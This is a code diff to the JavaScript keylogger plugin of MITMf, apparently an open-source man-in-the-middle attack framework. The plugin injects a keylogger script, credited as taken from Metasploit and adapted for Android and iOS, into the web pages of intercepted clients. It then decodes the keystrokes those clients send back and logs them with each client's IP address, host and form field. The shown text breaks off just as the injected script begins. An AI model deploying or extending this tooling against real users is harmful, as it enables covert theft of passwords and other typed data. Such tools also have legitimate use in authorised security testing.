@@ -21,25 +21,29 @@ import logging
 
 from plugins.plugin import Plugin
 from plugins.Inject import Inject
+from core.sergioproxy.ProxyPlugins import ProxyPlugins
 
 mitmf_logger = logging.getLogger("mitmf")
 
-class jskeylogger(Inject, Plugin):
+class jskeylogger(Plugin):
     name       = "Javascript Keylogger"
     optname    = "jskeylogger"
     desc       = "Injects a javascript keylogger into clients webpages"
-    implements = ["handleResponse", "handleHeader", "connectionMade", "sendPostData"]
-    depends    = ["Inject"]
     version    = "0.2"
     has_opts   = False
 
     def initialize(self, options):
-        Inject.initialize(self, options)
-        self.html_payload = self.msf_keylogger()
+        inject = Inject()
+        inject.initialize(options)
+        inject.html_payload = self.msf_keylogger()
+        ProxyPlugins.getInstance().addPlugin(inject)
 
-    def sendPostData(self, request):
+    def clientRequest(self, request):
         #Handle the plugin output
         if 'keylog' in request.uri:
+            request.printPostData = False
+
+            client_ip = request.client.getClientIP()
 
             raw_keys = request.postData.split("&&")[0]
             keys = raw_keys.split(",")
@@ -59,17 +63,12 @@ class jskeylogger(Inject, Plugin):
                     try:
                         nice += n.decode('hex')
                     except:
-                        mitmf_logger.warning("%s ERROR decoding char: %s" % (request.client.getClientIP(), n))
+                        mitmf_logger.error("{} [{}] Error decoding char: {}".format(client_ip, self.name, n))
 
-            #try:
-            #     input_field = input_field.decode('hex')
-            #except:
-            #    mitmf_logger.warning("%s ERROR decoding input field name: %s" % (request.client.getClientIP(), input_field))
-            
-            mitmf_logger.warning("%s [%s] Field: %s Keys: %s" % (request.client.getClientIP(), request.headers['host'], input_field, nice))
+            mitmf_logger.info("{} [{}] Host: {} Field: {} Keys: {}".format(client_ip, self.name, request.headers['host'], input_field, nice))
 
     def msf_keylogger(self):
-        #Stolen from the Metasploit module http_javascript_keylogger
+        #Stolen from the Metasploit module http_javascript_keylogger, modified to work in Android and IOS
 
         payload = """<script type="text/javascript">
 window.onload = function mainfunc(){
